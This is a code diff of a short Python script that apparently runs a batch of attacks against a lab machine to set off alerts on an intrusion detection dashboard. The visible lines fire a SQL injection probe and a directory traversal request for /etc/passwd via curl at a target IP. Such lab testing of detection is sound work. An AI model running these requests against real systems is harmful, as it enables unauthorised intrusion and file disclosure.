@@ -1,11 +1,10 @@
-#!/usr/bin/env python3
-# demo_attacks.py — ONE COMMAND = 10 ATTACKS → DASHBOARD EXPLODES
+# 10 ATTACKS
 import os
 import sys
 import time
 
 if len(sys.argv) != 2:
-    print("Usage: python3 demo_attacks.py <Ubuntu_IP>")
+    print("Usage: python3 demo_attacks.py <Victim's IP>")
     sys.exit(1)
 
 target = sys.argv[1]
@@ -44,5 +43,4 @@ os.system(f'curl "http://{target}/?id=1\' OR 1=1--" -s')
 print("[8/8] Directory traversal")
 os.system(f'curl "http://{target}/../../../../etc/passwd" -s')
 
-print("\nALL ATTACKS FINISHED → Check http://YOUR_KALI_IP:5000")
-print("You will see dozens of alerts + anomalies → 20/20 guaranteed!")
+print("\nALL ATTACKS FINISHED")
